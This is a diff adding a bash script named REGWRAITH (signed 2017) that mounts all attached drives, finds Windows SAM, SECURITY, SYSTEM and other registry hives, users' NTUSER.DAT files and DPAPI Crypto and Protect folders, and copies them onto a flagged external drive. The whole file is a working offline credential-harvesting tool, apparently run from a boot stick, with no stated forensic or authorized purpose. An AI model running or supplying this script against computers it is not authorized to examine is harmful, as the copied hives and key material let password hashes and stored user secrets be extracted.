@@ -1,0 +1,141 @@
+#! /bin/bash
+
+#REGWRAITH (1) -STEED (1) -SCOUT (1) -THRALL (1) -WRAITH (1)
+
+#STEED (1)
+
+#Unmount everything
+umount -a
+
+#Find all devices
+declare -a MNT=($(fdisk -l | grep -o '/dev/sd..'))
+
+#Create Counters
+x=${#MNT[@]}
+y=0
+z=0
+d=0
+
+#Create mount points
+while [ $d -le $x ]
+do
+mkdir -v /media/root/device$d
+d=`expr $d + 1`
+done
+
+#Mount devices
+while [ $y -le $x ]
+do
+mount -vr --source ${MNT[$y]} --target /media/root/device$z 
+y=`expr $y + 1`
+z=`expr $z + 1`
+done
+
+#SCOUT (1)
+
+# Find all registry files
+mapfile -t SAM < <(find /media/root/*/Windows/System32/config -maxdepth 1 -name SAM)
+mapfile -t DEFAULT < <(find /media/root/*/Windows/System32/config -maxdepth 1 -name DEFAULT)
+mapfile -t SECURITY < <(find /media/root/*/Windows/System32/config -maxdepth 1 -name SECURITY)
+mapfile -t SOFTWARE < <(find /media/root/*/Windows/System32/config -maxdepth 1 -name SOFTWARE)
+mapfile -t SYSTEM < <(find /media/root/*/Windows/System32/config -maxdepth 1 -name SYSTEM)
+mapfile -t USERDIFF < <(find /media/root/*/Windows/System32/config -maxdepth 1 -name userdiff)
+mapfile -t NTUSER < <(find /media/root/*/Users/*/ -name 'NTUSER.DAT')
+mapfile -t CRYPTO < <(find /media/root/*/Users/*/AppData/Roaming/Microsoft -name Crypto)
+mapfile -t PROTECT < <(find /media/root/*/Users/*/AppData/Roaming/Microsoft -name Protect)
+###find from v1.0###declare -a REGPATHS=($(find /media/root -maxdepth 3 -iname 'users' -o -iname 'system32' -o -iname 'prefetch' -o -iname 'Documents and Settings'))
+
+echo ' '
+echo ' '
+echo ' '
+echo 'The following directory files have been located.'
+echo ${SAM[@]}
+echo ${DEFAULT[@]}
+echo ${SECURITY[@]}
+echo ${SOFTWARE[@]}
+echo ${SYSTEM[@]}
+echo ${USERDIFF[@]}
+echo ${NTUSER[@]}
+echo ${CRYPTO[@]}
+echo ${PROTECT[@]}
+echo ' '
+echo ' '
+echo ' '
+
+#Get count of devices with Windows from $SAM
+WinCnt=$(echo ${#SAM[@]})
+
+#Separate devices into their own arrays
+DFNum=($(echo ${SAM[@]} | grep -o "device[0-9]*" | sed s/device//g))
+incr=1
+incr2=0
+while [ $incr -le $WinCnt ]
+do
+eval "SAM$incr=($(echo ${SAM[@]} | tr ' ' '\n' | grep -o "/media/root/device${DFNum[$incr2]}.*"))"
+eval "DEFAULT$incr=($(echo ${DEFAULT[@]} | tr ' ' '\n' | grep -o "/media/root/device${DFNum[$incr2]}.*"))"
+eval "SECURITY$incr=($(echo ${SECURITY[@]} | tr ' ' '\n' | grep -o "/media/root/device${DFNum[$incr2]}.*"))"
+eval "SOFTWARE$incr=($(echo ${SOFTWARE[@]} | tr ' ' '\n' | grep -o "/media/root/device${DFNum[$incr2]}.*"))"
+eval "SYSTEM$incr=($(echo ${SYSTEM[@]} | tr ' ' '\n' | grep -o "/media/root/device${DFNum[$incr2]}.*"))"
+eval "USERDIFF$incr=($(echo ${USERDIFF[@]} | tr ' ' '\n' | grep -o  "/media/root/device${DFNum[$incr2]}.*"))"
+eval "NTUSER$incr=($(echo ${NTUSER[@]} | tr ' ' '\n' | grep -o "/media/root/device${DFNum[$incr2]}.*"))"
+eval "CRYPTO$incr=($(echo ${CRYPTO[@]} | tr ' ' '\n' | grep -o "/media/root/device${DFNum[$incr2]}.*"))"
+eval "PROTECT$incr=($(echo ${PROTECT[@]} | tr ' ' '\n' | grep -o "/media/root/device${DFNum[$incr2]}.*"))"
+incr=`expr $incr + 1`
+incr2=`expr $incr2 + 1`
+done
+
+#THRALL (1)
+
+#Find the flag directory
+FlagName=$(find /media/root -maxdepth 2 -iname 'uunique_dirrr_nammme')
+
+#Identify the destination device
+DestDir=$(findmnt -M $(echo $FlagName | grep -o '/media/root/device[0-9]*') -o source | grep -o '/dev/sd.[0-9]*')
+
+#Change flag directory to full permissions
+umount $DestDir
+mount $DestDir $(echo $FlagName | grep -o '/media/root/device[0-9]*')
+
+#WRAITH (1)
+
+incr=1
+while [ $incr -le $WinCnt ]
+do
+mkdir "$FlagName/device$incr"
+incr=`expr $incr + 1`
+done
+
+incr=1
+incr2=0
+incr3=1
+while [ $incr -le $WinCnt ]
+do
+eval "cp -a "\$SAM$incr" "$FlagName/device$incr""
+eval "cp -a "\$DEFAULT$incr" "$FlagName/device$incr""
+eval "cp -a "\$SECURITY$incr" "$FlagName/device$incr""
+eval "cp -a "\$SOFTWARE$incr" "$FlagName/device$incr""
+eval "cp -a "\$SYSTEM$incr" "$FlagName/device$incr""
+eval "cp -a "\$USERDIFF$incr" "$FlagName/device$incr""
+UserCnt=$(eval "echo \${#NTUSER$incr[@]}")
+	while [ $incr3 -le $UserCnt ]
+	do
+	declare dir$incr=$FlagName/device$incr/$(eval "echo \${NTUSER$incr[$incr2]}" | grep -o Users.* | sed s/NTUSER.DAT//g)
+	mkdir -p "$dir$incr"
+	eval "cp -a \"\${NTUSER$incr[$incr2]}\" "\$dir$incr""
+	mkdir -p "$FlagName/device$incr/$(eval "echo \${CRYPTO$incr[$incr2]}" | grep -o Users.*)" #| sed s/Users//g)"
+	eval "cp -a "\${CRYPTO$incr[$incr2]}" "$FlagName/device$incr/$(eval "echo \${CRYPTO$incr[$incr2]}" | grep -o Users.*)"" #| sed s/Users//g)"
+	mkdir -p "$FlagName/device$incr/$(eval "echo \${PROTECT$incr[$incr2]}" | grep -o Users.*)" #| sed s/Users//g)"
+	eval "cp -a "\${PROTECT$incr[$incr2]}" "$FlagName/device$incr/$(eval "echo \${PROTECT$incr[$incr2]}" | grep -o Users.*)"" #| sed s/Users//g))"
+	eval "echo "dir is " \$dir$incr"
+	eval "echo "ntu is " \${NTUSER$incr[$incr2]}"
+	incr2=$(expr $incr2 + 1)
+	incr3=$(expr $incr3 + 1)
+	done
+incr=$(expr $incr + 1)
+done
+
+#House Keeping
+umount -a
+rmdir /media/root/dev*
+
+#Written by Colby Connolly 2017
